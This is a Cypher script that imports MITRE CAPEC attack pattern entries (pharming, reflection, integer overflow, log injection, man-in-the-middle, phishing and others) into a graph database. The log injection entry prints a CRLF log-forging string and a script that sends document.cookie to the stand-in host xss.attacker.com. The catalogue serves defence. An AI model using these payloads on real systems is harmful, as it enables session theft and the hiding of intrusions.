MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 369});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 370});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Weaknesses"});
CREATE (:Description{id: 597, summary: "OrderedDict([('Text', ['A pharming attack occurs when the victim is fooled into entering sensitive data into supposedly trusted locations, such as an online bank site or a trading platform. An attacker can impersonate these supposedly trusted sites and have the victim be directed to his site rather than the originally intended one.', 'Pharming does not require script injection or clicking on malicious links for the attack to succeed.'])])"});
CREATE (:AttackPhase{id: 1, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker sets up a system mocking the one trusted by the users. This is usually a website that requires or handles sensitive information.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker then poisons the resolver for the targeted site. This is achieved by poisoning the DNS server, or the local hosts file, that directs the user to the original website</p>\n</div>"});
CREATE (:AttackStep{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">When the victim requests the URL for the site, the poisoned records direct the victim to the attackers' system rather than the original one.</p>\n</div>"});
CREATE (:AttackStep{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Because of the identical nature of the original site and the attacker controlled one, and the fact that the URL is still the original one, the victim trusts the website reached and the attacker can now \"farm\" sensitive information such as credentials or account numbers.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2005-0877", description: "<div level=\"0\">\n  <p class=\"text\">Dnsmasq before 2.21 allows remote attackers to poison the DNS cache via answers to queries that were not made by Dnsmasq.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2004-1754", description: "<div level=\"0\">\n  <p class=\"text\">The DNS proxy (DNSd) for multiple Symantec Gateway Security products allows remote attackers to poison the DNS cache via a malicious DNS server query response that contains authoritative or additional records.</p>\n</div>"});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 350});
CREATE (:ResourcesRequired{id: 284, text: "<div level=\"0\">\n  <p class=\"text\">Except having enough knowledge of the way the targeted site has been structured in order to create a fake version, no additional resources are required. Poisoning the resolver requires knowledge of a vulnerability that can be exploited.</p>\n</div>"});
CREATE (:AttackPattern{id: 9, name: "Buffer Overflow in Local Command-Line Utilities", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 537, text: "<div level=\"0\">\n  <p class=\"text\">The target host exposes a command-line utility to the user.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 538, text: "<div level=\"0\">\n  <p class=\"text\">The command-line utility exposed by the target host has a buffer overflow vulnerability that can be exploited.</p>\n</div>"});
CREATE (:Submission{id: 604});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 371});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 598, summary: "OrderedDict([('Text', 'This attack targets command-line utilities available in a number of shells. An attacker can leverage a vulnerability found in a command-line utility to escalate privilege to root.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker identifies command utilities exposed by the target host.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">On the probing stage, the attacker interacts with the command utility and observes the results of its input. The attacker's goal is to uncover a buffer overflow in the command utility. For instance the attacker may find that input data are not properly validated.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker finds a buffer overflow vulnerability in the command utility and tries to exploit it. He crafts malicious code and injects it using the command utility. The attacker can at worst execute remote code on the target host.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.9.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.9.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-119: Buffer Errors", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/119.html"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 118});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 733});
MERGE (:CWE{id: 697});
CREATE (:AttackPattern{id: 90, name: "Reflection Attack in Authentication Protocol", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 539, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have direct access to the target server in order to successfully mount a reflection attack. An intermediate entity, such as a router or proxy, that handles these exchanges on behalf of the attacker inhibits the attackers' ability to attack the authentication protocol.</p>\n</div>"});
CREATE (:Submission{id: 605});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 372});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 599, summary: "OrderedDict([('Text', ['An attacker can abuse an authentication protocol susceptible to reflection attack in order to defeat it. Doing so allows the attacker illegitimate access to the target system, without possessing the requisite credentials.', 'Reflection attacks are of great concern to authentication protocols that rely on a challenge-handshake or similar mechanism. An attacker can impersonate a legitimate user and can gain illegitimate access to the system by successfully mounting a reflection attack during authentication.'])])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker opens a connection to the target server and sends it a challenge</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The server responds by returning the challenge encrypted with a shared secret as well as its own challenge to the attacker</p>\n</div>"});
CREATE (:AttackStep{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Since the attacker does not possess the shared secret, he initiates a second connection to the server and sends it, as challenge, the challenge received from the server on the first connection</p>\n</div>"});
CREATE (:AttackStep{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">The server treats this as just another handshake and responds by encrypting the challenge and issuing its own to the attacker</p>\n</div>"});
CREATE (:AttackStep{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">The attacker now receives the encrypted challenge on the second connection and sends it as response to the server on the first connection, thereby successfully completing the handshake and authenticating to the server.</p>\n</div>"});
MERGE (:CWE{id: 301});
MERGE (:CWE{id: 303});
MERGE (:CWE{id: 718});
CREATE (:ResourcesRequired{id: 286, text: "<div level=\"0\">\n  <p class=\"text\">All that the attacker requires is a means to observe and understand the protocol exchanges in order to reflect the challenges appropriately.</p>\n</div>"});
CREATE (:AttackPattern{id: 91, name: "DEPRECATED: XSS in IMG Tags", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 606});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 373});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Architectural_Paradigms, Attack_Motivation-Consequences, Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, CIA_Impact, Description, Description Summary, Examples-Instances, Frameworks, Injection_Vector, Languages, Methods_of_Attack, Payload, Payload_Activation_Impact, Platforms, Purposes, Related_Attack_Patterns, Related_Guidelines, Related_Security_Principles, Related_Vulnerabilities, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Technical_Context, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:PreviousEntryName{id: 102, name: "XSS in IMG Tags"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 600, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is contained in the existing attack pattern \"CAPEC-18 : XSS Targeting Non-Script Elements\". This specific attack pattern regarding the use of IMG elements is referenced as an example withing this other pattern. Please refer to this other CAPEC going forward.')])"});
CREATE (:AttackPattern{id: 92, name: "Forced Integer Overflow", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 540, text: "<div level=\"0\">\n  <p class=\"text\">The attacker can manipulate the value of an integer variable utilized by the target host.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 541, text: "<div level=\"0\">\n  <p class=\"text\">The target host does not do proper range checking on the variable before utilizing it.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 542, text: "<div level=\"0\">\n  <p class=\"text\">When the integer variable is incremented or decremented to an out of range value, it gets a very different value (e.g. very small or negative number)</p>\n</div>"});
CREATE (:Submission{id: 607});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 601, summary: "OrderedDict([('Text', 'This attack forces an integer variable to go out of range. The integer variable is often used as an offset such as size of memory allocation or similarly. The attacker would typically control the value of such variable and try to get it out of range. For instance the integer in question is incremented past the maximum possible value, it may wrap to become a very small, or negative number, therefore providing a very incorrect value which can lead to unexpected behavior. At worst the attacker can execute arbitrary code.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The first step is exploratory meaning the attacker looks for an integer variable that he can control.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker finds an integer variable that he can write into or manipulate and try to get the value of the integer out of the possible range.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The integer variable is forced to have a value out of range which set its final value to an unexpected value.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The target host acts on the data and unexpected behavior may happen.</p>\n</div>"});
MERGE (:Reference{id: "REF-29", local_id: "R.92.1", author: "['J. Viega', 'G. McGraw']", title: "Building Secure Software", publisher: "Addison-Wesley", pubdate: "2002"});
MERGE (:Reference{id: "REF-3", local_id: "R.92.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-190 - Integer overflow (wrap or wraparound)", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/190.html"});
MERGE (:Reference{id: "REF-5", local_id: "R.92.3", title: "The OWASP Application Security Desk Reference", section: "Integer overflow", publisher: "The Open Web Application Security Project (OWASP)", pubdate: "2009", link: "http://www.owasp.org/index.php/Integer_overflow"});
MERGE (:Reference{id: "REF-41", local_id: "R.92.4", author: "Robert C. Seacord", title: "SAMATE - Software Assurance Metrics And Tool Evaluation", section: "Test Case ID 1511", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2006-05-22", link: "http://samate.nist.gov/SRD/view_testcase.php?tID=1511"});
MERGE (:Reference{local_id: "R.92.5", author: "Robert C. Seacord", title: "Secure Coding in C and C++", section: "Page 152, Figure 5-1"});
MERGE (:CWE{id: 190});
MERGE (:CWE{id: 128});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 122});
MERGE (:CWE{id: 196});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 697});
CREATE (:AttackPattern{id: 93, name: "Log Injection-Tampering-Forging", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 543, text: "<div level=\"0\">\n  <p class=\"text\">The target host is logging the action and data of the user.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 544, text: "<div level=\"0\">\n  <p class=\"text\">The target host insufficiently protects access to the logs or logging mechanisms.</p>\n</div>"});
CREATE (:Submission{id: 608});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 374});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Modification{id: 375});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:Description{id: 602, summary: "OrderedDict([('Text', 'This attack targets the log files of the target host. The attacker injects, manipulates or forges malicious log entries in the log file, allowing him to mislead a log audit, cover traces of attack, or perform other malicious actions. The target host is not properly controlling log access. As a result tainted data is resulting in the log files leading to a failure in accountability, non-repudiation and incident forensics capability.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine Application's Log File Format", description: "<div level=\"0\">\n  <p class=\"text\">The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine logging utility being used by application (e.g. log4j)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Gain access to application's source code to determine log file formats.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Install or obtain access to instance of application and observe its log file format.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker determines log file format used by application."});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "Attacker cannot conclusively determine log file format; he/she can only guess what the format is."});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Manipulate Log Files", description: "<div level=\"0\">\n  <p class=\"text\">The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example:</p>\n  <p class=\"text\">may add the following forged entry into a log file:</p>\n  <p class=\"text\">Different applications may require different encodings of the carriage return and line feed characters.</p>\n  <div level=\"1\">\n    <p class=\"code\">\"%0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in\"</p>\n  </div>\n  <div level=\"1\">\n    <p class=\"code\">\"[Thu Nov 12 12:11:22]:Info: User admin logged in\"</p>\n  </div>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain</p>\n  <p class=\"text\">The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).</p>\n  <div level=\"1\">\n    <p class=\"code\"><script>new Image().src=\"http://xss.attacker.com/log_cookie?cookie=\"+encodeURI(document.cookie);</script></p>\n  </div>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Forged entry or other malicious data inserted into application's logs."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No entry inserted into logs, or the entry is visibly distinguishable from real entries."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:Reference{id: "REF-29", local_id: "R.93.1", author: "['J. Viega', 'G. McGraw']", title: "Building Secure Software", publisher: "Addison-Wesley", pubdate: "2002"});
MERGE (:Reference{id: "REF-3", local_id: "R.93.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-117 - Log Forging", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/117.html"});
MERGE (:Reference{local_id: "R.92.3", author: "A. Muffet", title: "The night the log was forged", link: "http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm"});
MERGE (:Reference{id: "REF-5", local_id: "R.92.4", title: "The OWASP Application Security Desk Reference", section: "Log injection", publisher: "The Open Web Application Security Project (OWASP)", pubdate: "2009", link: "http://www.owasp.org/index.php/Log injection"});
MERGE (:Reference{id: "REF-41", local_id: "R.92.5", author: "Fortify Software", title: "SAMATE - Software Assurance Metrics And Tool Evaluation", section: "Test Case ID 1579", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2006-06-22", link: "http://samate.nist.gov/SRD/view_testcase.php?tID=1579"});
MERGE (:Reference{local_id: "R.92.6", author: "ATT&CK Project", title: "Indicator Removal on Host (1070)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Indicator_removal_on_host"});
MERGE (:CWE{id: 117});
MERGE (:CWE{id: 75});
MERGE (:CWE{id: 150});
MERGE (:CWE{id: 713});
CREATE (:AttackPattern{id: 94, name: "Man in the Middle Attack", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 545, text: "<div level=\"0\">\n  <p class=\"text\">There are two components communicating with each other.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 546, text: "<div level=\"0\">\n  <p class=\"text\">An attacker is able to identify the nature and mechanism of communication between the two target components.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 547, text: "<div level=\"0\">\n  <p class=\"text\">An attacker can eavesdrop on the communication between the target components.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 548, text: "<div level=\"0\">\n  <p class=\"text\">Strong mutual authentication is not used between the two target components yielding opportunity for attacker interposition.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 549, text: "<div level=\"0\">\n  <p class=\"text\">The communication occurs in clear (not encrypted) or with insufficient and spoofable encryption.</p>\n</div>"});
CREATE (:Submission{id: 609});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 603, summary: "OrderedDict([('Text', 'This type of attack targets the communication between two components (typically client and server). The attacker places himself in the communication channel between the two components. Whenever one component attempts to communicate with the other (data flow, authentication challenges, etc.), the data first goes to the attacker, who has the opportunity to observe or alter it, and it is then passed on to the other component as if it was never intercepted. This interposition is transparent leaving the two compromised components unaware of the potential corruption or leakage of their communications. The potential for Man-in-the-Middle attacks yields an implicit lack of trust in communication or identify between two components.')])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker probes to determine the nature and mechanism of communication between two components looking for opportunities to exploit.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker inserts himself into the communication channel initially acting as a routing proxy between the two targeted components. The attacker may or may not have to use cryptography.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker observes, filters or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for his own purposes.</p>\n</div>"});
MERGE (:Reference{id: "REF-3", local_id: "R.94.1", title: "Common Weakness Enumeration (CWE)", section: "CWE-300 - Man-in-the-middle (MITM)", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/300.html"});
MERGE (:Reference{local_id: "R.94.2", author: "M. Bishop", title: "Computer Security: Art and Science", publisher: "Addison-Wesley", pubdate: "2003"});
MERGE (:CWE{id: 300});
MERGE (:CWE{id: 290});
MERGE (:CWE{id: 593});
MERGE (:CWE{id: 287});
MERGE (:CWE{id: 294});
MERGE (:CWE{id: 724});
CREATE (:AttackPattern{id: 95, name: "WSDL Scanning", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 550, text: "<div level=\"0\">\n  <p class=\"text\">A client program connecting to a web service can read the WSDL to determine what functions are available on the server.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 551, text: "<div level=\"0\">\n  <p class=\"text\">The target host exposes vulnerable functions within its WSDL interface.</p>\n</div>"});
CREATE (:Submission{id: 610});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 376});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 604, summary: "OrderedDict([('Text', 'This attack targets the WSDL interface made available by a web service. The attacker may scan the WSDL interface to reveal sensitive information about invocation patterns, underlying technology implementations and associated vulnerabilities. This type of probing is carried out to perform more serious attacks (e.g. parameter tampering, malicious content injection, command injection, etc.). WSDL files provide detailed information about the services ports and bindings available to consumers. For instance, the attacker can submit special characters or malicious content to the Web service and can cause a denial of service condition or illegal access to database records. In addition, the attacker may try to guess other private methods by using the information provided in the WSDL files.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The first step is exploratory meaning the attacker scans for WSDL documents. The WDSL document written in XML is like a handbook on how to communicate with the web services provided by the target host. It provides an open view of the application (function details, purpose, functional break down, entry points, message types, etc.). This is very useful information for the attacker.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The second step that an attacker would undertake is to analyze the WSDL files and try to find potential weaknesses by sending messages matching the pattern described in the WSDL file. The attacker could run through all of the operations with different message request patterns until a breach is identified.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Once an attacker finds a potential weakness, they can craft malicious content to be sent to the system. For instance the attacker may try to submit special characters and observe how the system reacts to an invalid request. The message sent by the attacker may not be XML validated and cause unexpected behavior.</p>\n</div>"});
MERGE (:Reference{id: "REF-3", local_id: "R.95.1", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{local_id: "R.95.2", author: "Walid Negm", title: "Anatomy of a Web Services Attack", publisher: "ForumSystems", pubdate: "March 1, 2004", link: "http://www.forumsys.com/resources/resources/whitepapers/archive//Anatomy_of_Attack_wp.pdf"});
MERGE (:Reference{local_id: "R.95.3", author: "Frank Coyle", title: "Seven Steps to XML Mastery", section: "Step 7: Ensure XML Security", pubdate: "August 25, 2006", link: "http://www.informit.com/articles/article.aspx?p=601349"});
MERGE (:CWE{id: 538});
CREATE (:AttackPattern{id: 96, name: "Block Access to Libraries", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 552, text: "<div level=\"0\">\n  <p class=\"text\">An application requires access to external libraries.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 553, text: "<div level=\"0\">\n  <p class=\"text\">An attacker has the privileges to block application access to external libraries.</p>\n</div>"});
CREATE (:Submission{id: 611});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 377});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 605, summary: "OrderedDict([('Text', 'An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. It is possible that the application does not handle situations properly where access to these libraries has been blocked. Depending on the error handling within the application, blocked access to libraries may leave the system in an insecure state that could be leveraged by an attacker.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine what external libraries the application accesses.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Block access to the external libraries accessed by the application.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Monitor the behavior of the system to see if it goes into an insecure/inconsistent state.</p>\n</div>"});
CREATE (:AttackStep{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">If the system does go into an insecure/inconsistent state, leverage that to obtain information about the system functionality or data, elevate access control, etc. The rest of this attack will depend on the context and the desired goal.</p>\n</div>"});
MERGE (:CWE{id: 589});
MERGE (:CWE{id: 227});
CREATE (:AttackPattern{id: 97, name: "Cryptanalysis", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 554, text: "<div level=\"0\">\n  <p class=\"text\">The target software utilizes some sort of cryptographic algorithm.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 555, text: "<div level=\"0\">\n  <p class=\"text\">An underlying weaknesses exists either in the cryptographic algorithm used or in the way that it was applied to a particular chunk of plaintext.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 556, text: "<div level=\"0\">\n  <p class=\"text\">The encryption algorithm is known to the attacker.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 557, text: "<div level=\"0\">\n  <p class=\"text\">An attacker has access to the ciphertext.</p>\n</div>"});
CREATE (:Submission{id: 612});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 378});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 606, summary: "OrderedDict([('Text', ['Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as:', 'The goal of the attacker performing cryptanalysis will depend on the specific needs of the attacker in a given attack context. In most cases, if cryptanalysis is successful at all, an attacker will not be able to go past being able to deduce some information about the plaintext (goal 3). However, that may be sufficient for an attacker, depending on the context.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Total Break - Finding the secret key', '2. Global Deduction - Finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key.', '3. Information Deduction - Gaining some information about plaintexts or ciphertexts that was not previously known', '4. Distinguishing Algorithm - The attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits'])]))])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker leverages the discovered weakness to decrypt, partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key.</p>\n</div>"});
MERGE (:Reference{id: "REF-6", local_id: "R.97.1", title: "Wikipedia", section: "Cryptanalysis", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Cryptanalysis"});
MERGE (:CWE{id: 327});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 719});
CREATE (:ResourcesRequired{id: 292, text: "<div level=\"0\">\n  <p class=\"text\">Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required.</p>\n</div>"});
CREATE (:AttackPattern{id: 98, name: "Phishing", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 558, text: "<div level=\"0\">\n  <p class=\"text\">An attacker needs to have a way to initiate contact with the victim. Typically that will happen through e-mail.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 559, text: "<div level=\"0\">\n  <p class=\"text\">An attacker needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their \"hooks\" to many potential victims.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 560, text: "<div level=\"0\">\n  <p class=\"text\">An attacker needs to have a sufficiently compelling call to action to prompt the user to take action.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 561, text: "<div level=\"0\">\n  <p class=\"text\">The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity.</p>\n</div>"});
CREATE (:Submission{id: 613});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 607, summary: "OrderedDict([('Text', 'Phishing is a social engineering technique where an attacker masquerades as a legitimate entity with which the victim might do business in order to prompt the user to reveal some confidential information (very frequently authentication credentials) that can later be used by an attacker. Phishing is essentially a form of information gathering or \"fishing\" for information.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
